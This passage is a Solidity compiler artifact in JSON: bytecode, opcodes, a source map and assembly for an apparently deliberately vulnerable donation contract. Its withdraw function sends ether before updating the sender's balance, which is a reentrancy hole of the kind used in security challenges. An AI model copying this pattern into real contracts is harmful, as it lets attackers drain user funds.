PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x40A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 ORIGIN 0x1F DIV 0xD2 0xE6 DUP9 0xBB DIFFICULTY PUSH5 0xE6CD65BBA2 EXP 0xAF SWAP11 0xB8 0xF9 PUSH24 0x114E17FDECCD51C3239B960364736F6C634300060C003300 ",
							"sourceMap": "281:578:0:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100425760003560e01c8062362a951461004e57806327e235e3146100925780632e1a7d4d146100f757806370a082311461013257610049565b3661004957005b600080fd5b6100906004803603602081101561006457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610197565b005b34801561009e57600080fd5b506100e1600480360360208110156100b557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061022d565b6040518082815260200191505060405180910390f35b34801561010357600080fd5b506101306004803603602081101561011a57600080fd5b8101908080359060200190929190505050610245565b005b34801561013e57600080fd5b506101816004803603602081101561015557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610344565b6040518082815260200191505060405180910390f35b6101e8346000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461038c90919063ffffffff16565b6000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b60006020528060005260406000206000915090505481565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054106103415760003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d80600081146102ea576040519150601f19603f3d011682016040523d82523d6000602084013e6102ef565b606091505b50509050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550505b50565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60008082840190508381101561040a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b809150509291505056fea2646970667358221220321f04d2e688bb4464e6cd65bba20aaf9ab8f977114e17fdeccd51c3239b960364736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH3 0x362A95 EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x27E235E3 EQ PUSH2 0x92 JUMPI DUP1 PUSH4 0x2E1A7D4D EQ PUSH2 0xF7 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x132 JUMPI PUSH2 0x49 JUMP JUMPDEST CALLDATASIZE PUSH2 0x49 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x90 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x197 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xE1 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xB5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x22D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x103 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x130 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x11A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x245 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x181 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x155 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x344 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E8 CALLVALUE PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x38C SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT PUSH2 0x341 JUMPI PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x2EA JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x2EF JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP2 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x40A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 ORIGIN 0x1F DIV 0xD2 0xE6 DUP9 0xBB DIFFICULTY PUSH5 0xE6CD65BBA2 EXP 0xAF SWAP11 0xB8 0xF9 PUSH24 0x114E17FDECCD51C3239B960364736F6C634300060C003300 ",
							"sourceMap": "281:578:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;383:99;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;338:40;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;590:234;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;486:100;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;383:99;449:28;467:9;449:8;:13;458:3;449:13;;;;;;;;;;;;;;;;:17;;:28;;;;:::i;:::-;433:8;:13;442:3;433:13;;;;;;;;;;;;;;;:44;;;;383:99;:::o;338:40::-;;;;;;;;;;;;;;;;;:::o;590:234::-;662:7;638:8;:20;647:10;638:20;;;;;;;;;;;;;;;;:31;635:185;;680:11;696:10;:15;;718:7;696:34;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;679:51;;;806:7;782:8;:20;791:10;782:20;;;;;;;;;;;;;;;;:31;;;;;;;;;;;635:185;;590:234;:::o;486:100::-;540:12;567:8;:14;576:4;567:14;;;;;;;;;;;;;;;;560:21;;486:100;;;:::o;867:176:2:-;925:7;944:9;960:1;956;:5;944:17;;984:1;979;:6;;971:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1035:1;1028:8;;;867:176;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "219600",
								"executionCost": "263",
								"totalCost": "219863"
							},
							"external": {
								"balanceOf(address)": "1240",
								"balances(address)": "1169",
								"donate(address)": "infinite",
								"withdraw(uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 281,
									"end": 859,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 281,
									"end": 859,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 281,
									"end": 859,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 281,
									"end": 859,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 281,
									"end": 859,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 281,
									"end": 859,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 281,
									"end": 859,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 281,
									"end": 859,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 281,
									"end": 859,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 281,
									"end": 859,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 281,
									"end": 859,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 281,
									"end": 859,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 281,
									"end": 859,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 281,
									"end": 859,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 281,
									"end": 859,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 281,
									"end": 859,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 281,
									"end": 859,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 281,
									"end": 859,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 281,
									"end": 859,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 281,
									"end": 859,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 281,
									"end": 859,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220321f04d2e688bb4464e6cd65bba20aaf9ab8f977114e17fdeccd51c3239b960364736f6c634300060c0033",
									".code": [
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "362A95"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "27E235E3"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "2E1A7D4D"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "70A08231"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 281,
											"end": 859,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 281,
											"end": 859,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 383,
											"end": 482,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 383,
											"end": 482,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 338,
											"end": 378,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 338,
											"end": 378,
											"name": "SWAP2",
											"source": 0
										},
										{
